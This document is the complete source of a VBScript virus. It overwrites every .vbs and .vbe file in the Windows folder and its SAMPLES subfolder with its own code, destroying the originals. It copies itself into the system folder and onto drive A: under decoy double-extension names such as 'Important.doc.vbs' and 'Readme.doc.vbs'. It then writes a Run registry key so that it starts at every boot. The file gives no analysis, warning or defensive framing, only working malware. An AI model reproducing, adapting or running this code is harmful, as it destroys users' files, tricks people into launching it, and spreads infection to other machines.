On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("Wscript.Shell")
Set Wfolder = FSO.GetSpecialFolder(0)
Set Sysfolder = FSO.GetSpecialFolder(1)
Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1)
Self = OpenSelf.ReadAll
Function InfectVBSFiles(Folder)
 Set Dir = FSO.GetFolder(Folder)
 For Each ScriptFile in Dir.Files
  ExtensionName = Lcase(FSO.GetExtensionName(ScriptFile.path))
  If ExtensionName = "vbs" or ExtensionName = "vbe" then
   Set Script = FSO.OpenTextFile(ScriptFile.path, 2, True)
   Script.WriteLine Self
   Script.Close
  End If
 Next
End Function
Call InfectVBSFiles(Wfolder)
Call InfectVBSFiles(Wfolder & "\SAMPLES\")
Randomize
RNumber = INT(Rnd * 6)
If RNumber = 0 then RName = "\Important.doc.vbs"
If RNumber = 1 then RName = "\Important.doc.vbs"
If RNumber = 2 then RName = "\Notice.doc.vbs"
If RNumber = 3 then RName = "\Help.doc.vbs"
If RNumber = 4 then RName = "\Readme.doc.vbs"
If RNumber = 5 then RName = "\Readthis.doc.vbs"
If RNumber = 6 then RName = "\Legal.doc.vbs"
FSO.CopyFile Wscript.ScriptFullName, Sysfolder & RName, True
FSO.CopyFile Wscript.ScriptFullName, "A:" & RName, True
WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\!", Sysfolder & RName